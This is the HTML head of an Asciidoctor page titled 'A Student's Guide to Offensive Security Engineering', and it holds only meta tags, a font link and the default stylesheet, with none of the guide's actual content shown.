<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Asciidoctor 2.0.12">
<meta name="author" content="Andrew Yu">
<title>A Student&#8217;s Guide to Offensive Security Engineering</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700">
<style>
/* Asciidoctor default stylesheet | MIT License | https://asciidoctor.org */
/* Uncomment @import statement to use as custom stylesheet */
/*@import "https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,600,600italic%7CNoto+Serif:400,400italic,700,700italic%7CDroid+Sans+Mono:400,700";*/
article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}
audio,video{display:inline-block}
audio:not([controls]){display:none;height:0}
html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
a{background:none}
a:focus{outline:thin dotted}
a:active,a:hover{outline:0}
h1{font-size:2em;margin:.67em 0}
abbr[title]{border-bottom:1px dotted}
b,strong{font-weight:bold}
dfn{font-style:italic}
hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}
mark{background:#ff0;color:#000}
code,kbd,pre,samp{font-family:monospace;font-size:1em}
pre{white-space:pre-wrap}
q{quotes:"\201C" "\201D" "\2018" "\2019"}
small{font-size:80%}
sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
sup{top:-.5em}
sub{bottom:-.25em}
img{border:0}
svg:not(:root){overflow:hidden}
figure{margin:0}
fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}
legend{border:0;padding:0}
button,input,select,textarea{font-family:inherit;font-size:100%;margin:0}
button,input{line-height:normal}
button,select{text-transform:none}
button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}
button[disabled],html input[disabled]{cursor:default}
input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}
button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
textarea{overflow:auto;vertical-align:top}
table{border-collapse:collapse;border-spacing:0}
*,*::before,*::after{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
html,body{font-size:100%}
body{background:#fff;color:rgba(0,0,0,.8);padding:0;margin:0;font-family:"Noto Serif","DejaVu Serif",serif;font-weight:400;font-style:normal;line-height:1;position:relative;cursor:auto;tab-size:4;word-wrap:anywhere;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased}
a:hover{cursor:pointer}
img,object,embed{max-width:100%;height:auto}
object,embed{height:100%}
img{-ms-interpolation-mode:bicubic}
.left{float:left!important}
.right{float:right!important}
.text-left{text-align:left!important}
.text-right{text-align:right!important}
.text-center{text-align:center!important}
.text-justify{text-align:justify!important}
.hide{display:none}
img,object,svg{display:inline-block;vertical-align:middle}
textarea{height:auto;min-height:50px}
select{width:100%}
.subheader,.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{line-height:1.45;color:#7a2518;font-weight:400;margin-top:0;margin-bottom:.25em}
div,dl,dt,dd,ul,ol,li,h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6,pre,form,p,blockquote,th,td{margin:0;padding:0}
a{color:#2156a5;text-decoration:underline;line-height:inherit}
a:hover,a:focus{color:#1d4b8f}
a img{border:0}
p{font-family:inherit;font-weight:400;font-size:1em;line-height:1.6;margin-bottom:1.25em;text-rendering:optimizeLegibility}
p aside{font-size:.875em;line-height:1.35;font-style:italic}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{font-family:"Open Sans","DejaVu Sans",sans-serif;font-weight:300;font-style:normal;color:#ba3925;text-rendering:optimizeLegibility;margin-top:1em;margin-bottom:.5em;line-height:1.0125em}
h1 small,h2 small,h3 small,#toctitle small,.sidebarblock>.content>.title small,h4 small,h5 small,h6 small{font-size:60%;color:#e99b8f;line-height:0}
h1{font-size:2.125em}
h2{font-size:1.6875em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.375em}
h4,h5{font-size:1.125em}
h6{font-size:1em}
hr{border:solid #dddddf;border-width:1px 0 0;clear:both;margin:1.25em 0 1.1875em;height:0}
em,i{font-style:italic;line-height:inherit}
strong,b{font-weight:bold;line-height:inherit}
small{font-size:60%;line-height:inherit}
code{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;font-weight:400;color:rgba(0,0,0,.9)}
ul,ol,dl{font-size:1em;line-height:1.6;margin-bottom:1.25em;list-style-position:outside;font-family:inherit}
ul,ol{margin-left:1.5em}
ul li ul,ul li ol{margin-left:1.25em;margin-bottom:0;font-size:1em}
ul.square li ul,ul.circle li ul,ul.disc li ul{list-style:inherit}
ul.square{list-style-type:square}
ul.circle{list-style-type:circle}
ul.disc{list-style-type:disc}
ol li ul,ol li ol{margin-left:1.25em;margin-bottom:0}
dl dt{margin-bottom:.3125em;font-weight:bold}
dl dd{margin-bottom:1.25em}
abbr,acronym{text-transform:uppercase;font-size:90%;color:rgba(0,0,0,.8);border-bottom:1px dotted #ddd;cursor:help}
abbr{text-transform:none}
blockquote{margin:0 0 1.25em;padding:.5625em 1.25em 0 1.1875em;border-left:1px solid #ddd}
blockquote cite{display:block;font-size:.9375em;color:rgba(0,0,0,.6)}
blockquote cite::before{content:"\2014 \0020"}
blockquote cite a,blockquote cite a:visited{color:rgba(0,0,0,.6)}
blockquote,blockquote p{line-height:1.6;color:rgba(0,0,0,.85)}
@media screen and (min-width:768px){h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2}
h1{font-size:2.75em}
h2{font-size:2.3125em}
h3,#toctitle,.sidebarblock>.content>.title{font-size:1.6875em}
h4{font-size:1.4375em}}
table{background:#fff;margin-bottom:1.25em;border:solid 1px #dedede;word-wrap:normal}
table thead,table tfoot{background:#f7f8f7}
table thead tr th,table thead tr td,table tfoot tr th,table tfoot tr td{padding:.5em .625em .625em;font-size:inherit;color:rgba(0,0,0,.8);text-align:left}
table tr th,table tr td{padding:.5625em .625em;font-size:inherit;color:rgba(0,0,0,.8)}
table tr.even,table tr.alt{background:#f8f8f7}
table thead tr th,table tfoot tr th,table tbody tr td,table tr td,table tfoot tr td{line-height:1.6}
h1,h2,h3,#toctitle,.sidebarblock>.content>.title,h4,h5,h6{line-height:1.2;word-spacing:-.05em}
h1 strong,h2 strong,h3 strong,#toctitle strong,.sidebarblock>.content>.title strong,h4 strong,h5 strong,h6 strong{font-weight:400}
.center{margin-left:auto;margin-right:auto}
.stretch{width:100%}
.clearfix::before,.clearfix::after,.float-group::before,.float-group::after{content:" ";display:table}
.clearfix::after,.float-group::after{clear:both}
:not(pre).nobreak{word-wrap:normal}
:not(pre).nowrap{white-space:nowrap}
:not(pre).pre-wrap{white-space:pre-wrap}
:not(pre):not([class^=L])>code{font-size:.9375em;font-style:normal!important;letter-spacing:0;padding:.1em .5ex;word-spacing:-.15em;background:#f7f7f8;-webkit-border-radius:4px;border-radius:4px;line-height:1.45;text-rendering:optimizeSpeed}
pre{color:rgba(0,0,0,.9);font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;line-height:1.45;text-rendering:optimizeSpeed}
pre code,pre pre{color:inherit;font-size:inherit;line-height:inherit}
pre>code{display:block}
pre.nowrap,pre.nowrap pre{white-space:pre;word-wrap:normal}
em em{font-style:normal}
strong strong{font-weight:400}
.keyseq{color:rgba(51,51,51,.8)}
kbd{font-family:"Droid Sans Mono","DejaVu Sans Mono",monospace;display:inline-block;color:rgba(0,0,0,.8);font-size:.65em;line-height:1.45;background:#f7f7f7;border:1px solid #ccc;-webkit-border-radius:3px;border-radius:3px;-webkit-box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em white inset;box-shadow:0 1px 0 rgba(0,0,0,.2),0 0 0 .1em #fff inset;margin:0 .15em;padding:.2em .5em;vertical-align:middle;position:relative;top:-.1em;white-space:nowrap}
.keyseq kbd:first-child{margin-left:0}
.keyseq kbd:last-child{margin-right:0}
.menuseq,.menuref{color:#000}
.menuseq b:not(.caret),.menuref{font-weight:inherit}
.menuseq{word-spacing:-.02em}
.menuseq b.caret{font-size:1.25em;line-height:.8}
.menuseq i.caret{font-weight:bold;text-align:center;width:.45em}
b.button::before,b.button::after{position:relative;top:-1px;font-weight:400}
b.button::before{content:"[";padding:0 3px 0 2px}
b.button::after{content:"]";padding:0 2px 0 3px}
p a>code:hover{color:rgba(0,0,0,.9)}
#header,#content,#footnotes,#footer{width:100%;margin-left:auto;margin-right:auto;margin-top:0;margin-bottom:0;max-width:62.5em;*zoom:1;position:relative;padding-left:.9375em;padding-right:.9375em}
#header::before,#header::after,#content::before,#content::after,#footnotes::before,#footnotes::after,#footer::before,#footer::after{content:" ";display:table}
#header::after,#content::after,#footnotes::after,#footer::after{clear:both}
#content{margin-top:1.25em}
#content::before{content:none}
#header>h1:first-child{color:rgba(0,0,0,.85);margin-top:2.25rem;margin-bottom:0}
#header>h1:first-child+#toc{margin-top:8px;border-top:1px solid #dddddf}
#header>h1:only-child,body.toc2 #header>h1:nth-last-child(2){border-bottom:1px solid #dddddf;padding-bottom:8px}
#header .details{border-bottom:1px solid #dddddf;line-height:1.45;padding-top:.25em;padding-bottom:.25em;padding-left:.25em;color:rgba(0,0,0,.6);display:-ms-flexbox;display:-webkit-flex;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap}
#header .details span:first-child{margin-left:-.125em}
#header .details span.email a{color:rgba(0,0,0,.85)}
#header .details br{display:none}
#header .details br+span::before{content:"\00a0\2013\00a0"}
#header .details br+span.author::before{content:"\00a0\22c5\00a0";color:rgba(0,0,0,.85)}
#header .details br+span#revremark::before{content:"\00a0|\00a0"}
#header #revnumber{text-transform:capitalize}
#header #revnumber::after{content:"\00a0"}
#content>h1:first-child:not([class]){color:rgba(0,0,0,.85);border-bottom:1px solid #dddddf;padding-bottom:8px;margin-top:0;padding-top:1rem;margin-bottom:1.25rem}
#toc{border-bottom:1px solid #e7e7e9;padding-bottom:.5em}
#toc>ul{margin-left:.125em}
#toc ul.sectlevel0>li>a{font-style:italic}
#toc ul.sectlevel0 ul.sectlevel1{margin:.5em 0}
#toc ul{font-family:"Open Sans","DejaVu Sans",sans-serif;list-style-type:none}
#toc li{line-height:1.3334;margin-top:.3334em}
#toc a{text-decoration:none}
#toc a:active{text-decoration:underline}
#toctitle{color:#7a2518;font-size:1.2em}
@media screen and (min-width:768px){#toctitle{font-size:1.375em}
body.toc2{padding-left:15em;padding-right:0}
#toc.toc2{margin-top:0!important;background:#f8f8f7;position:fixed;width:15em;left:0;top:0;border-right:1px solid #e7e7e9;border-top-width:0!important;border-bottom-width:0!important;z-index:1000;padding:1.25em 1em;height:100%;overflow:auto}
#toc.toc2 #toctitle{margin-top:0;margin-bottom:.8rem;font-size:1.2em}
#toc.toc2>ul{font-size:.9em;margin-bottom:0}
#toc.toc2 ul ul{margin-left:0;padding-left:1em}
#toc.toc2 ul.sectlevel0 ul.sectlevel1{padding-left:0;margin-top:.5em;margin-bottom:.5em}
body.toc2.toc-right{padding-left:0;padding-right:15em}
body.toc2.toc-right #toc.toc2{border-right-width:0;border-left:1px solid #e7e7e9;left:auto;right:0}}
@media screen and (min-width:1280px){body.toc2{padding-left:20em;padding-right:0}
#toc.toc2{width:20em}
#toc.toc2 #toctitle{font-size:1.375em}
#toc.toc2>ul{font-size:.95em}
#toc.toc2 ul ul{padding-left:1.25em}
body.toc2.toc-right{padding-left:0;padding-right:20em}}
#content #toc{border-style:solid;border-width:1px;border-color:#e0e0dc;margin-bottom:1.25em;padding:1.25em;background:#f8f8f7;-webkit-border-radius:4px;border-radius:4px}
#content #toc>:first-child{margin-top:0}
#content #toc>:last-child{margin-bottom:0}
#footer{max-width:none;background:rgba(0,0,0,.8);padding:1.25em}
#footer-text{color:rgba(255,255,255,.8);line-height:1.44}
#content{margin-bottom:.625em}
.sect1{padding-bottom:.625em}
@media screen and (min-width:768px){#content{margin-bottom:1.25em}
.sect1{padding-bottom:1.25em}}
.sect1:last-child{padding-bottom:0}
.sect1+.sect1{border-top:1px solid #e7e7e9}
#content h1>a.anchor,h2>a.anchor,h3>a.anchor,#toctitle>a.anchor,.sidebarblock>.content>.title>a.anchor,h4>a.anchor,h5>a.anchor,h6>a.anchor{position:absolute;z-index:1001;width:1.5ex;margin-left:-1.5ex;display:block;text-decoration:none!important;visibility:hidden;text-align:center;font-weight:400}
#content h1>a.anchor::before,h2>a.anchor::before,h3>a.anchor::before,#toctitle>a.anchor::before,.sidebarblock>.content>.title>a.anchor::before,h4>a.anchor::before,h5>a.anchor::before,h6>a.anchor::before{content:"\00A7";font-size:.85em;display:block;padding-top:.1em}
#content h1:hover>a.anchor,#content h1>a.anchor:hover,h2:hover>a.anchor,h2>a.anchor:hover,h3:hover>a.anchor,#toctitle:hover>a.anchor,.sidebarblock>.content>.title:hover>a.anchor,h3>a.anchor:hover,#toctitle>a.anchor:hover,.sidebarblock>.content>.title>a.anchor:hover,h4:hover>a.anchor,h4>a.anchor:hover,h5:hover>a.anchor,h5>a.anchor:hover,h6:hover>a.anchor,h6>a.anchor:hover{visibility:visible}
#content h1>a.link,h2>a.link,h3>a.link,#toctitle>a.link,.sidebarblock>.content>.title>a.link,h4>a.link,h5>a.link,h6>a.link{color:#ba3925;text-decoration:none}
#content h1>a.link:hover,h2>a.link:hover,h3>a.link:hover,#toctitle>a.link:hover,.sidebarblock>.content>.title>a.link:hover,h4>a.link:hover,h5>a.link:hover,h6>a.link:hover{color:#a53221}
details,.audioblock,.imageblock,.literalblock,.listingblock,.stemblock,.videoblock{margin-bottom:1.25em}
details>summary:first-of-type{cursor:pointer;display:list-item;outline:none;margin-bottom:.75em}
.admonitionblock td.content>.title,.audioblock>.title,.exampleblock>.title,.imageblock>.title,.listingblock>.title,.literalblock>.title,.stemblock>.title,.openblock>.title,.paragraph>.title,.quoteblock>.title,table.tableblock>.title,.verseblock>.title,.videoblock>.title,.dlist>.title,.olist>.title,.ulist>.title,.qlist>.title,.hdlist>.title{text-rendering:optimizeLegibility;text-align:left;font-family:"Noto Serif","DejaVu Serif",serif;font-size:1rem;font-style:italic}
table.tableblock.fit-content>caption.title{white-space:nowrap;width:0}
.paragraph.lead>p,#preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:1.21875em;line-height:1.6;color:rgba(0,0,0,.85)}
table.tableblock #preamble>.sectionbody>[class="paragraph"]:first-of-type p{font-size:inherit}
.admonitionblock>table{border-collapse:separate;border:0;background:none;width:100%}
.admonitionblock>table td.icon{text-align:center;width:80px}
.admonitionblock>table td.icon img{max-width:none}
.admonitionblock>table td.icon .title{font-weight:bold;font-family:"Open Sans","DejaVu Sans",sans-serif;text-transform:uppercase}
.admonitionblock>table td.content{padding-left:1.125em;padding-right:1.25em;border-left:1px solid #dddddf;color:rgba(0,0,0,.6);word-wrap:anywhere}
.admonitionblock>table td.content>:last-child>:last-child{margin-bottom:0}
.exampleblock>.content{border-style:solid;border-width:1px;border-color:#e6e6e6;margin-bottom:1.25em;padding:1.25em;background:#fff;-webkit-border-radius:4px;border-radius:4px}
.exampleblock>.content>:first-child{margin-top:0}
.exampleblock>.content>:last-child{margin-bottom:0}
.sidebarblock{border-style:solid;border-width:1px;border-color:#dbdbd6;margin-bottom:1.25em;padding:1.25em;background:#f3f3f2;-webkit-border-radius:4px;border-radius:4px}
.sidebarblock>:first-child{margin-top:0}
.sidebarblock>:last-child{margin-bottom:0}
.sidebarblock>.content>.title{color:#7a2518;margin-top:0;text-align:center}
.exampleblock>.content>:last-child>:last-child,.exampleblock>.content .olist>ol>li:last-child>:last-child,.exampleblock>.content .ulist>ul>li:last-child>:last-child,.exampleblock>.content .qlist>ol>li:last-child>:last-child,.sidebarblock>.content>:last-child>:last-child,.sidebarblock>.content .olist>ol>li:last-child>:last-child,.sidebarblock>.content .ulist>ul>li:last-child>:last-child,.sidebarblock>.content .qlist>ol>li:last-child>:last-child{margin-bottom:0}
.literalblock pre,.listingblock>.content>pre{-webkit-border-radius:4px;border-radius:4px;overflow-x:auto;padding:1em;font-size:.8125em}
@media screen and (min-width:768px){.literalblock pre,.listingblock>.content>pre{font-size:.90625em}}
@media screen and (min-width:1280px){.literalblock pre,.listingblock>.content>pre{font-size:1em}}
.literalblock pre,.listingblock>.content>pre:not(.highlight),.listingblock>.content>pre[class="highlight"],.listingblock>.content>pre[class^="highlight "]{background:#f7f7f8}
.literalblock.output pre{color:#f7f7f8;background:rgba(0,0,0,.9)}
.listingblock>.content{position:relative}
.listingblock code[data-lang]::before{display:none;content:attr(data-lang);position:absolute;font-size:.75em;top:.425rem;right:.5rem;line-height:1;text-transform:uppercase;color:inherit;opacity:.5}
.listingblock:hover code[data-lang]::before{display:block}
.listingblock.terminal pre .command::before{content:attr(data-prompt);padding-right:.5em;color:inherit;opacity:.5}
.listingblock.terminal pre .command:not([data-prompt])::before{content:"$"}
.listingblock pre.highlightjs{padding:0}
.listingblock pre.highlightjs>code{padding:1em;-webkit-border-radius:4px;border-radius:4px}
.listingblock pre.prettyprint{border-width:0}
.prettyprint{background:#f7f7f8}
pre.prettyprint .linenums{line-height:1.45;margin-left:2em}
pre.prettyprint li{background:none;list-style-type:inherit;padding-left:0}
pre.prettyprint li code[data-lang]::before{opacity:1}
pre.prettyprint li:not(:first-child) code[data-lang]::before{display:none}
table.linenotable{border-collapse:separate;border:0;margin-bottom:0;background:none}
table.linenotable td[class]{color:inherit;vertical-align:top;padding:0;line-height:inherit;white-space:normal}
table.linenotable td.code{padding-left:.75em}
table.linenotable td.linenos{border-right:1px solid currentColor;opacity:.35;padding-right:.5em}
pre.pygments .lineno{border-right:1px solid currentColor;opacity:.35;display:inline-block;margin-right:.75em}
pre.pygments .lineno::before{content:"";margin-right:-.125em}
.quoteblock{margin:0 1em 1.25em 1.5em;display:table}
.quoteblock:not(.excerpt)>.title{margin-left:-1.5em;margin-bottom:.75em}
.quoteblock blockquote,.quoteblock p{color:rgba(0,0,0,.85);font-size:1.15rem;line-height:1.75;word-spacing:.1em;letter-spacing:0;font-style:italic;text-align:justify}
.quoteblock blockquote{margin:0;padding:0;border:0}
.quoteblock blockquote::before{content:"\201c";float:left;font-size:2.75em;font-weight:bold;line-height:.6em;margin-left:-.6em;color:#7a2518;text-shadow:0 1px 2px rgba(0,0,0,.1)}
.quoteblock blockquote>.paragraph:last-child p{margin-bottom:0}
.quoteblock .attribution{margin-top:.75em;margin-right:.5ex;text-align:right}
.verseblock{margin:0 1em 1.25em}
.verseblock pre{font-family:"Open Sans","DejaVu Sans",sans;font-size:1.15rem;color:rgba(0,0,0,.85);font-weight:300;text-rendering:optimizeLegibility}
.verseblock pre strong{font-weight:400}
.verseblock .attribution{margin-top:1.25rem;margin-left:.5ex}
.quoteblock .attribution,.verseblock .attribution{font-size:.9375em;line-height:1.45;font-style:italic}
.quoteblock .attribution br,.verseblock .attribution br{display:none}
.quoteblock .attribution cite,.verseblock .attribution cite{display:block;letter-spacing:-.025em;color:rgba(0,0,0,.6)}
.quoteblock.abstract blockquote::before,.quoteblock.excerpt blockquote::before,.quoteblock .quoteblock blockquote::before{display:none}
.quoteblock.abstract blockquote,.quoteblock.abstract p,.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{line-height:1.6;word-spacing:0}
.quoteblock.abstract{margin:0 1em 1.25em;display:block}
.quoteblock.abstract>.title{margin:0 0 .375em;font-size:1.15em;text-align:center}
.quoteblock.excerpt>blockquote,.quoteblock .quoteblock{padding:0 0 .25em 1em;border-left:.25em solid #dddddf}
.quoteblock.excerpt,.quoteblock .quoteblock{margin-left:0}
.quoteblock.excerpt blockquote,.quoteblock.excerpt p,.quoteblock .quoteblock blockquote,.quoteblock .quoteblock p{color:inherit;font-size:1.0625rem}
.quoteblock.excerpt .attribution,.quoteblock .quoteblock .attribution{color:inherit;text-align:left;margin-right:0}
p.tableblock:last-child{margin-bottom:0}
td.tableblock>.content{margin-bottom:1.25em;word-wrap:anywhere}
td.tableblock>.content>:last-child{margin-bottom:-1.25em}
table.tableblock,th.tableblock,td.tableblock{border:0 solid #dedede}
table.grid-all>*>tr>*{border-width:1px}
table.grid-cols>*>tr>*{border-width:0 1px}
table.grid-rows>*>tr>*{border-width:1px 0}
table.frame-all{border-width:1px}
table.frame-ends{border-width:1px 0}
table.frame-sides{border-width:0 1px}
table.frame-none>colgroup+*>:first-child>*,table.frame-sides>colgroup+*>:first-child>*{border-top-width:0}
table.frame-none>:last-child>:last-child>*,table.frame-sides>:last-child>:last-child>*{border-bottom-width:0}
table.frame-none>*>tr>:first-child,table.frame-ends>*>tr>:first-child{border-left-width:0}
table.frame-none>*>tr>:last-child,table.frame-ends>*>tr>:last-child{border-right-width:0}
table.stripes-all tr,table.stripes-odd tr:nth-of-type(odd),table.stripes-even tr:nth-of-type(even),table.stripes-hover tr:hover{background:#f8f8f7}
th.halign-left,td.halign-left{text-align:left}
th.halign-right,td.halign-right{text-align:right}
th.halign-center,td.halign-center{text-align:center}
th.valign-top,td.valign-top{vertical-align:top}
th.valign-bottom,td.valign-bottom{vertical-align:bottom}
th.valign-middle,td.valign-middle{vertical-align:middle}
table thead th,table tfoot th{font-weight:bold}
tbody tr th{background:#f7f8f7}
tbody tr th,tbody tr th p,tfoot tr th,tfoot tr th p{color:rgba(0,0,0,.8);font-weight:bold}
p.tableblock>code:only-child{background:none;padding:0}
p.tableblock{font-size:1em}
ol{margin-left:1.75em}
ul li ol{margin-left:1.5em}
dl dd{margin-left:1.125em}
dl dd:last-child,dl dd:last-child>:last-child{margin-bottom:0}
ol>li p,ul>li p,ul dd,ol dd,.olist .olist,.ulist .ulist,.ulist .olist,.olist .ulist{margin-bottom:.625em}
ul.checklist,ul.none,ol.none,ul.no-bullet,ol.no-bullet,ol.unnumbered,ul.unstyled,ol.unstyled{list-style-type:none}
ul.no-bullet,ol.no-bullet,ol.unnumbered{margin-left:.625em}
ul.unstyled,ol.unstyled{margin-left:0}
ul.checklist{margin-left:.625em}
ul.checklist li>p:first-child>.fa-square-o:first-child,ul.checklist li>p:first-child>.fa-check-square-o:first-child{width:1.25em;font-size:.8em;position:relative;bottom:.125em}
ul.checklist li>p:first-child>input[type="checkbox"]:first-child{margin-right:.25em}
ul.inline{display:-ms-flexbox;display:-webkit-box;display:flex;-ms-flex-flow:row wrap;-webkit-flex-flow:row wrap;flex-flow:row wrap;list-style:none;margin:0 0 .625em -1.25em}
ul.inline>li{margin-left:1.25em}
.unstyled dl dt{font-weight:400;font-style:normal}
ol.arabic{list-style-type:decimal}
ol.decimal{list-style-type:decimal-leading-zero}
ol.loweralpha{list-style-type:lower-alpha}
ol.upperalpha{list-style-type:upper-alpha}
ol.lowerroman{list-style-type:lower-roman}
ol.upperroman{list-style-type:upper-roman}
ol.lowergreek{list-style-type:lower-greek}
.hdlist>table,.colist>table{border:0;background:none}
.hdlist>table>tbody>tr,.colist>table>tbody>tr{background:none}
td.hdlist1,td.hdlist2{vertical-align:top;padding:0 .625em}
td.hdlist1{font-weight:bold;padding-bottom:1.25em}
td.hdlist2{word-wrap:anywhere}
.literalblock+.colist,.listingblock+.colist{margin-top:-.5em}
.colist td:not([class]):first-child{padding:.4em .75em 0;line-height:1;vertical-align:top}
.colist td:not([class]):first-child img{max-width:none}
.colist td:not([class]):last-child{padding:.25em 0}
.thumb,.th{line-height:0;display:inline-block;border:solid 4px #fff;-webkit-box-shadow:0 0 0 1px #ddd;box-shadow:0 0 0 1px #ddd}
.imageblock.left{margin:.25em .625em 1.25em 0}
.imageblock.right{margin:.25em 0 1.25em .625em}
.imageblock>.title{margin-bottom:0}
.imageblock.thumb,.imageblock.th{border-width:6px}
.imageblock.thumb>.title,.imageblock.th>.title{padding:0 .125em}
.image.left,.image.right{margin-top:.25em;margin-bottom:.25em;display:inline-block;line-height:0}
.image.left{margin-right:.625em}
.image.right{margin-left:.625em}
a.image{text-decoration:none;display:inline-block}
a.image object{pointer-events:none}
sup.footnote,sup.footnoteref{font-size:.875em;position:static;vertical-align:super}
sup.footnote a,sup.footnoteref a{text-decoration:none}
sup.footnote a:active,sup.footnoteref a:active{text-decoration:underline}
#footnotes{padding-top:.75em;padding-bottom:.75em;margin-bottom:.625em}
#footnotes hr{width:20%;min-width:6.25em;margin:-.25em 0 .75em;border-width:1px 0 0}
#footnotes .footnote{padding:0 .375em 0 .225em;line-height:1.3334;font-size:.875em;margin-left:1.2em;margin-bottom:.2em}
#footnotes .footnote a:first-of-type{font-weight:bold;text-decoration:none;margin-left:-1.05em}
#footnotes .footnote:last-of-type{margin-bottom:0}
#content #footnotes{margin-top:-.625em;margin-bottom:0;padding:.75em 0}
.gist .file-data>table{border:0;background:#fff;width:100%;margin-bottom:0}
.gist .file-data>table td.line-data{width:99%}
div.unbreakable{page-break-inside:avoid}
.big{font-size:larger}
.small{font-size:smaller}
.underline{text-decoration:underline}
.overline{text-decoration:overline}
.line-through{text-decoration:line-through}
.aqua{color:#00bfbf}
.aqua-background{background:#00fafa}
.black{color:#000}
.black-background{background:#000}
.blue{color:#0000bf}
.blue-background{background:#0000fa}
.fuchsia{color:#bf00bf}
.fuchsia-background{background:#fa00fa}
.gray{color:#606060}
.gray-background{background:#7d7d7d}
.green{color:#006000}
.green-background{background:#007d00}
.lime{color:#00bf00}
.lime-background{background:#00fa00}
.maroon{color:#600000}
.maroon-background{background:#7d0000}
.navy{color:#000060}
.navy-background{background:#00007d}
.olive{color:#606000}
.olive-background{background:#7d7d00}
.purple{color:#600060}
.purple-background{background:#7d007d}
.red{color:#bf0000}
.red-background{background:#fa0000}
.silver{color:#909090}
.silver-background{background:#bcbcbc}
.teal{color:#006060}
.teal-background{background:#007d7d}
.white{color:#bfbfbf}
.white-background{background:#fafafa}
.yellow{color:#bfbf00}
.yellow-background{background:#fafa00}
span.icon>.fa{cursor:default}
a span.icon>.fa{cursor:inherit}
.admonitionblock td.icon [class^="fa icon-"]{font-size:2.5em;text-shadow:1px 1px 2px rgba(0,0,0,.5);cursor:default}
.admonitionblock td.icon .icon-note::before{content:"\f05a";color:#19407c}
.admonitionblock td.icon .icon-tip::before{content:"\f0eb";text-shadow:1px 1px 2px rgba(155,155,0,.8);color:#111}
.admonitionblock td.icon .icon-warning::before{content:"\f071";color:#bf6900}
.admonitionblock td.icon .icon-caution::before{content:"\f06d";color:#bf3400}
.admonitionblock td.icon .icon-important::before{content:"\f06a";color:#bf0000}
.conum[data-value]{display:inline-block;color:#fff!important;background:rgba(0,0,0,.8);-webkit-border-radius:50%;border-radius:50%;text-align:center;font-size:.75em;width:1.67em;height:1.67em;line-height:1.67em;font-family:"Open Sans","DejaVu Sans",sans-serif;font-style:normal;font-weight:bold}
.conum[data-value] *{color:#fff!important}
.conum[data-value]+b{display:none}
.conum[data-value]::after{content:attr(data-value)}
pre .conum[data-value]{position:relative;top:-.125em}
b.conum *{color:inherit!important}
.conum:not([data-value]):empty{display:none}
dt,th.tableblock,td.content,div.footnote{text-rendering:optimizeLegibility}
h1,h2,p,td.content,span.alt{letter-spacing:-.01em}
p strong,td.content strong,div.footnote strong{letter-spacing:-.005em}
p,blockquote,dt,td.content,span.alt{font-size:1.0625rem}
p{margin-bottom:1.25rem}
.sidebarblock p,.sidebarblock dt,.sidebarblock td.content,p.tableblock{font-size:1em}
.exampleblock>.content{background:#fffef7;border-color:#e0e0dc;-webkit-box-shadow:0 1px 4px #e0e0dc;box-shadow:0 1px 4px #e0e0dc}
.print-only{display:none!important}
@page{margin:1.25cm .75cm}
@media print{*{-webkit-box-shadow:none!important;box-shadow:none!important;text-shadow:none!important}
html{font-size:80%}
a{color:inherit!important;text-decoration:underline!important}
a.bare,a[href^="#"],a[href^="mailto:"]{text-decoration:none!important}
a[href^="http:"]:not(.bare)::after,a[href^="https:"]:not(.bare)::after{content:"(" attr(href) ")";display:inline-block;font-size:.875em;padding-left:.25em}
abbr[title]::after{content:" (" attr(title) ")"}
pre,blockquote,tr,img,object,svg{page-break-inside:avoid}
thead{display:table-header-group}
svg{max-width:100%}
p,blockquote,dt,td.content{font-size:1em;orphans:3;widows:3}
h2,h3,#toctitle,.sidebarblock>.content>.title{page-break-after:avoid}
#header,#content,#footnotes,#footer{max-width:none}
#toc,.sidebarblock,.exampleblock>.content{background:none!important}
#toc{border-bottom:1px solid #dddddf!important;padding-bottom:0!important}
body.book #header{text-align:center}
body.book #header>h1:first-child{border:0!important;margin:2.5em 0 1em}
body.book #header .details{border:0!important;display:block;padding:0!important}
body.book #header .details span:first-child{margin-left:0!important}
body.book #header .details br{display:block}
body.book #header .details br+span::before{content:none!important}
body.book #toc{border:0!important;text-align:left!important;padding:0!important;margin:0!important}
body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-break-before:always}
.listingblock code[data-lang]::before{display:block}
#footer{padding:0 .9375em}
.hide-on-print{display:none!important}
.print-only{display:block!important}
.hide-for-print{display:none!important}
.show-for-print{display:inherit!important}}
@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
